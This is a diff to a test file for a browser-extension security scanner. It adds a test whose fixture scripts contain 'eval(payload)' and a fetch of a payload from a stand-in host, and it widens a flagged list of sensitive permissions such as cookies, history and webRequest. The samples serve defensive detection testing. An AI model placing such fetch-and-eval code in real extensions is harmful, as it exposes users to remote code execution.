@@ -46,6 +46,7 @@ describe("browser extension review adapter", () => {
     ]);
     expect(browserExtensionIdentity(manifest)).toBe("tab-helper@example.invalid");
     expect(manifest.backgroundEntrypoints).toEqual(["background.js"]);
+    expect(manifest.contentScriptEntrypoints).toEqual(["content.js"]);
     expect(manifest.hostPermissions).toEqual(["https://example.invalid/*"]);
     expect(manifest.contentScriptMatches).toEqual(["https://example.invalid/*"]);
   });
@@ -96,12 +97,57 @@ describe("browser extension review adapter", () => {
       })),
     );
     expect(browserAdapter.summarizeDetails(staged.details)).toMatchObject({
+      publicPackageIdentity: null,
       provenance: {
         ecosystem: "browser",
         mode: "workflow_gate",
         artifacts: [{ path, kind: "zip", sha256: SHA }],
       },
     });
+  });
+
+  test("treats manifest-loaded scripts under test directories as consumer reachable", () => {
+    const path = "dist/tab-helper.zip";
+    const manifest = buildBrowserReleaseManifest("Tab helper", "1.2.0", [{ path, sha256: SHA }]);
+    const review = createBrowserExtensionReview({
+      manifest,
+      artifact: {
+        path,
+        sha256: SHA,
+        files: [
+          manifestFile({
+            background: { service_worker: "tests/background.js" },
+            content_scripts: [{ matches: ["https://example.invalid/*"], js: ["tests/content.js"] }],
+          }),
+          {
+            path: "tests/background.js",
+            size: 14,
+            sha256: "33".repeat(32),
+            flags: [],
+            textSample: "eval(payload);",
+          },
+          {
+            path: "tests/content.js",
+            size: 42,
+            sha256: "44".repeat(32),
+            flags: [],
+            textSample: 'fetch("https://example.invalid/payload");',
+          },
+        ],
+      },
+    });
+    const capabilities = review.ruleFindings.filter((finding) =>
+      ["code.dynamic-evaluation", "code.network-access"].includes(finding.ruleId),
+    );
+    expect(capabilities).toHaveLength(2);
+    expect(capabilities.map(({ ruleId, severity }) => ({ ruleId, severity }))).toEqual(
+      expect.arrayContaining([
+        { ruleId: "code.dynamic-evaluation", severity: "high" },
+        { ruleId: "code.network-access", severity: "medium" },
+      ]),
+    );
+    expect(capabilities.every((finding) => finding.testScoped !== true)).toBe(true);
+    expect(review.risk).toBe("high");
   });
 
   test("rejects adapter inputs that are not bound to the declared archive", () => {
@@ -157,29 +203,41 @@ describe("browser extension review adapter", () => {
     expect(review.risk).toBe("high");
   });
 
-  test.each(["clipboardRead", "clipboardWrite", "cookies", "downloads", "history", "tabs"])(
-    "flags sensitive browser permission %s",
-    (permission) => {
-      const path = "dist/tab-helper.zip";
-      const manifest = buildBrowserReleaseManifest("Tab helper", "1.2.0", [
-        {
-          path,
-          sha256: SHA,
-        },
-      ]);
-      const review = createBrowserExtensionReview({
-        manifest,
-        artifact: {
-          path,
-          sha256: SHA,
-          files: [manifestFile({ permissions: [permission] })],
-        },
-      });
-      expect(review.ruleFindings.map((finding) => finding.ruleId)).toContain(
-        "browser.privileged-permission",
-      );
-    },
-  );
+  test.each([
+    "bookmarks",
+    "clipboardRead",
+    "clipboardWrite",
+    "cookies",
+    "downloads",
+    "geolocation",
+    "history",
+    "identity",
+    "identity.email",
+    "sessions",
+    "tabs",
+    "topSites",
+    "webNavigation",
+    "webRequest",
+  ])("flags sensitive browser permission %s", (permission) => {
+    const path = "dist/tab-helper.zip";
+    const manifest = buildBrowserReleaseManifest("Tab helper", "1.2.0", [
+      {
+        path,
+        sha256: SHA,
+      },
+    ]);
+    const review = createBrowserExtensionReview({
+      manifest,
+      artifact: {
+        path,
+        sha256: SHA,
+        files: [manifestFile({ permissions: [permission] })],
+      },
+    });
+    expect(review.ruleFindings.map((finding) => finding.ruleId)).toContain(
+      "browser.privileged-permission",
+    );
+  });
 
   test.each([
     "default-src 'self' cdn.example.invalid",
